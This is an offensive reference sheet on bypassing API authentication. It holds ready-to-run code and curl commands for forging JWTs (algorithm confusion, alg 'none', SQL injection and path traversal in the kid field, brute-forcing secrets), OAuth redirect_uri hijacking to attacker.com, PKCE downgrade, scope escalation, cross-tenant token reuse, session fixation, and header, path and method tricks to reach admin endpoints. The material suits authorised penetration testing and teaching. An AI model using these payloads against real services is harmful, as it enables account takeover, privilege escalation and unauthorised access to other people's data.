# API Authentication Bypass Reference

## JWT Attacks

### Algorithm Confusion (RS256 → HS256)
```python
import jwt, base64

# 1. Get the server's public key (from JWKS endpoint, TLS cert, or .well-known)
public_key = open("public_key.pem").read()

# 2. Sign token with HS256 using the public key as the HMAC secret
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

### Algorithm None
```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
# Try variations: "none", "None", "NONE", "nOnE"
```

### Key ID (kid) Injection
```bash
# Path traversal in kid
{"alg":"HS256","kid":"../../dev/null"}  # Sign with empty string
{"alg":"HS256","kid":"/proc/sys/kernel/hostname"}  # Sign with hostname value

# SQL injection in kid
{"alg":"HS256","kid":"' UNION SELECT 'secret-key' -- "}
```

### JWK/JKU Header Injection
```bash
# Embed attacker's key in token header
{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
# Point to attacker's JWKS endpoint
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}
```

### Weak Secret Brute-Force
```bash
# hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt_tool
python3 jwt_tool.py $JWT -C -d /usr/share/wordlists/rockyou.txt
# Custom (fast for short secrets)
python3 -c "
import jwt, sys
token = sys.argv[1]
for word in open('/usr/share/wordlists/rockyou.txt','rb'):
    try:
        jwt.decode(token, word.strip(), algorithms=['HS256'])
        print(f'SECRET: {word.strip().decode()}')
        break
    except: pass
" "$JWT"
```

### Token Manipulation
```bash
# Expired token — does server check exp?
# Decode, change exp to future, re-sign (if you know the secret)

# Cross-tenant — use token from tenant A on tenant B's API
curl -sk -H "Authorization: Bearer $TENANT_A_TOKEN" "$TENANT_B_API/users"

# Signature stripping — remove signature, keep header.payload
TOKEN="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
curl -sk -H "Authorization: Bearer $TOKEN" "$ENDPOINT"
```

## OAuth 2.0 Attacks

### Authorization Code Theft
```bash
# redirect_uri manipulation
https://auth.target.com/authorize?client_id=app&redirect_uri=https://attacker.com/callback&response_type=code

# Bypass patterns:
# Subdomain: redirect_uri=https://evil.target.com/callback
# Path traversal: redirect_uri=https://target.com/callback/../../../attacker.com
# Open redirect chain: redirect_uri=https://target.com/redirect?url=https://attacker.com
# Parameter pollution: redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com
```

### PKCE Downgrade
```bash
# If server supports both PKCE and non-PKCE flows:
# Request auth code WITHOUT code_challenge → exchange WITHOUT code_verifier
# If server accepts → PKCE not enforced (stolen code is usable)
curl -s "https://auth.target.com/authorize?client_id=app&redirect_uri=https://target.com/callback&response_type=code"
# No code_challenge parameter → check if code exchange works without verifier
```

### Token Exchange Abuse
```bash
# Exchange access token for different scope
curl -s -X POST "https://auth.target.com/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=$ACCESS_TOKEN" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "scope=admin:full"
```

### Client Credential Theft
```bash
# Check for public clients (no client_secret required)
curl -s -X POST "https://auth.target.com/token" \
  -d "grant_type=client_credentials&client_id=public-app"
# If returns token → public client with server-side permissions

# Device code flow (no redirect needed)
curl -s -X POST "https://auth.target.com/device/code" \
  -d "client_id=app&scope=openid profile"
```

## API Key Attacks

### Key Discovery
```bash
# Common locations
grep -rE "(api[_-]?key|apikey|x-api-key|authorization)" js_bundles/
# URL parameters (logged in access logs, referer headers)
# Response headers (some APIs echo the key back)
# Error messages ("Invalid API key: sk-test-...")
```

### Key Privilege Testing
```bash
# Test key against admin endpoints
curl -sk -H "X-API-Key: $KEY" "$BASE_URL/api/admin/users"
# Test key scope (read key accessing write endpoints)
curl -sk -X POST -H "X-API-Key: $READ_KEY" "$BASE_URL/api/resources" -d '{"name":"test"}'
# Test key across environments (prod key on staging, vice versa)
curl -sk -H "X-API-Key: $STAGING_KEY" "$PROD_URL/api/users"
```

## Session-Based Attacks

### Session Fixation
```bash
# 1. Get a session ID
SESSION=$(curl -sk -c - "$BASE_URL/login" | grep session | awk '{print $NF}')
# 2. Force victim to use this session (via URL param, cookie injection)
# 3. After victim authenticates, attacker's session is now authenticated
```

### Session Puzzling
```bash
# Use session state from one flow in another
# 1. Start password reset flow (sets session.user = target)
curl -sk -X POST "$BASE_URL/api/forgot-password" -d '{"email":"victim@test.com"}' -c cookies.txt
# 2. Access authenticated endpoint (session.user is set from step 1)
curl -sk -b cookies.txt "$BASE_URL/api/users/me"
```

## Bypass Techniques

### Header-Based Auth Bypass
```bash
# Internal proxy headers
curl -sk -H "X-Forwarded-For: 127.0.0.1" "$ENDPOINT"
curl -sk -H "X-Real-IP: 10.0.0.1" "$ENDPOINT"
curl -sk -H "X-Original-URL: /admin" "$BASE_URL/"
curl -sk -H "X-Rewrite-URL: /admin" "$BASE_URL/"

# Custom internal headers
curl -sk -H "X-Internal: true" "$ENDPOINT"
curl -sk -H "X-Custom-Auth: bypass" "$ENDPOINT"
```

### Path-Based Auth Bypass
```bash
# Case sensitivity
curl -sk "$BASE_URL/ADMIN/users"
curl -sk "$BASE_URL/Admin/Users"
# Path normalization
curl -sk "$BASE_URL/./admin/users"
curl -sk "$BASE_URL/admin/./users"
curl -sk "$BASE_URL/%61dmin/users"
# Trailing characters
curl -sk "$BASE_URL/admin/users/"
curl -sk "$BASE_URL/admin/users.json"
curl -sk "$BASE_URL/admin/users;.js"
```

### Method-Based Auth Bypass
```bash
# Auth only on GET, not on HEAD/OPTIONS
curl -sk -X HEAD "$ENDPOINT" -w "%{http_code}"
curl -sk -X OPTIONS "$ENDPOINT"
# Override method
curl -sk -X POST -H "X-HTTP-Method-Override: GET" "$ENDPOINT"
```

## Tools

| Tool | Purpose |
|------|---------|
| jwt_tool | JWT analysis and attack automation |
| jwt.io | JWT decode and verify |
| hashcat (mode 16500) | JWT secret brute-force |
| Burp JWT extensions | JWT manipulation in proxy |
| oauth-tools | OAuth flow testing |
| Postman | API auth flow testing |
